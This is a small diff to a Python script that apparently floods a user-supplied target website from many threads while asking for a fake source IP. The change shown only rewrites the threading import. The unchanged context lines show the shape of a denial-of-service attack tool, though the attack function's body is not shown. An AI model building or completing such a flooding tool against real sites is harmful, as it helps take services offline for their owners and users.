@@ -1,5 +1,5 @@
 from socket import socket, AF_INET, SOCK_STREAM
-import threading
+from threading import Thread
 
 fake_ip = input("Fake IP address: ")
 target = input("Target website: ")
@@ -21,5 +21,5 @@ def attack(count):
 
 
 for i in range(attack_count):
-    thread = threading.Thread(target=attack, args=i)
+    thread = Thread(target=attack, args=i)
     thread.start()
